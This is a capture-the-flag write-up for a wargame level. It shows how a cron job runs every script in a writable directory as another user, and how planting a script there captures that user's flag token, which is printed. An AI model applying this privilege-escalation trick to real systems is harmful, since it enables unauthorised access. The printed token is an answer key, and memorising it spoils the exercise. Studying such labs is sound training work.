What do we have?

	$ ll
	total 12
	dr-xr-x---+ 1 level05 level05  100 Mar  5  2016 ./
	d--x--x--x  1 root    users    340 Aug 30  2015 ../
	-r-x------  1 level05 level05  220 Apr  3  2012 .bash_logout*
	-r-x------  1 level05 level05 3518 Aug 30  2015 .bashrc*
	-r-x------  1 level05 level05  675 Apr  3  2012 .profile*

Nothing... but it's not a problem, we remembered we came across a directory about mails and `level05`.

	$ cd var/mail
	$ ll
	total 4
	drwxrwsr-x  1 root mail  60 Mar  5  2016 ./
	drwxr-xr-x  1 root root 180 Mar 12  2016 ../
	-rw-r--r--+ 1 root mail  58 Jul 17 09:27 level05

If we `cat` the file:

	$ cat level05
	*/2 * * * * su -c "sh /usr/sbin/openarenaserver" - flag05

That's a crontab, running `/usr/sbin/openarenaserver` as `flag05`. If we `cat` that file:

	$ cat /usr/sbin/openarenaserver 
	#!/bin/sh

	for i in /opt/openarenaserver/* ; do
		(ulimit -t 5; bash -x "$i")
		rm -f "$i"
	done

That's a shell script executing the binary presents in `/opt/openarenaserver`, and then deleting them. There is nothing inside of that folder for now, but we have the rights to write there! 

	$ cd /opt/openarenaserver/
	$ ll
	total 0
	drwxrwxr-x+ 2 root root 40 Jul 17 11:58 ./
	drwxr-xr-x  1 root root 60 Jul 17 09:27 ../

Our first guess was to copy `getflag` directly there, and wait 2 minutes, but the output was silenced, despite the binary being deleted, proof that the crontab ran.

	$ ll
	total 0
	drwxrwxr-x+ 2 root root 40 Jul 17 11:58 ./
	drwxr-xr-x  1 root root 60 Jul 17 09:27 ../

So we made a shell script to call `getflag` but redirecting its output to a file, that we can `cat` after the execution.

	$ echo 'getflag > /tmp/out' > ./script.sh

And after 2 minutes...

	$ cat /tmp/out
	Check flag.Here is your token : viuaaale9huek52boumoomioc
